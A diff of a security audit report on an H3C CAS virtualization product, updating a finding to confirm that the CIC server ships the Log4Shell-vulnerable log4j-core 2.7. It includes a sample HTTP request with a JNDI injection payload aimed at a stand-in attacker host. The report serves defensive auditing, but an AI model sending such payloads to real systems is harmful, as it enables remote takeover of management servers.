@@ -308,13 +308,30 @@ Class.forName("...").getMethod("...").invoke(...)
 
 **Description:** The CAS server core class uses `Class.forName()` with string concatenation and `getMethod().invoke()` for dynamic class loading. If any part of these strings is derived from user input (configuration files, HTTP parameters, DB values), an attacker could load arbitrary Java classes and invoke methods, leading to RCE.
 
-## ZD-014: log4j2 in Use — Potential Log4Shell (CVE-2021-44228)
-**File:** `cas-java-decompiled/casserver/sources/com/h3c/cas/server/c.java:20`
-**Severity:** HIGH (if version < 2.17.1) / CRITICAL (if version < 2.16.0)
+## ZD-014: Log4Shell — CIC Server ships with log4j-core-2.7 (CVE-2021-44228)
+**File:** `H3C_CAS-R0785P03-h3linux-x86_64/extras/front.package/cic/var/lib/casserver/server/lib/log4j-core-2.7.jar`
+**CVE:** CVE-2021-44228 (CVSS 10.0)
+**Severity:** CRITICAL
 
-```java
-private static String c = "/conf/log4j2.xml";
-System.setProperty("log4j.configurationFile", ...);
+**CONFIRMED VULNERABLE VERSION:**
+```
+CIC Server: log4j-core-2.7.jar → VULNERABLE to Log4Shell (CVSS 10.0)
+CIC Server: log4j-api-2.7.jar → VULNERABLE
+CIC Server: log4j-slf4j-impl-2.7.jar → VULNERABLE
+CIC Server: log4j-jcl-2.7.jar → VULNERABLE
+
+CVM Server: log4j-core-2.18.0.jar → SAFE (patched)
+WARs (cas/cic/ssv): log4j-core-2.18.0.jar → SAFE (patched)
 ```
 
-**Description:** The CAS server uses log4j2 for logging. If the deployed log4j2 version is below 2.17.1, Log4Shell (CVE-2021-44228, CVSS 10.0) applies — unauthenticated RCE via JNDI lookup injection. The actual version would need to be confirmed from the deployed `log4j-core-*.jar` in the WEB-INF/lib directory. Given CAS R0785P03 ships with openEuler and Java 8, the log4j version is likely 2.11-2.14 (vulnerable).
+**Description:** The CIC management server component ships with log4j-core version 2.7 (released 2017). This version is vulnerable to Log4Shell — unauthenticated RCE via JNDI injection in log messages. Any user input that reaches a log4j log statement (HTTP headers, URL parameters, user agent, request body) can trigger the vulnerability.
+
+**Attack Vector:**
+```http
+GET /casrs/ HTTP/1.1
+User-Agent: ${jndi:ldap://attacker.com:1389/Exploit}
+```
+
+The CIC server runs with the same Tomcat/JVM as the CAS web applications. Successful exploitation gives the attacker full control of the CIC management console server, which typically has network access to all CVK hypervisors and the PostgreSQL database.
+
+**Remediation:** Replace log4j-core-2.7.jar with version 2.18.0 (or >= 2.17.1). The CVM server already uses the patched version.
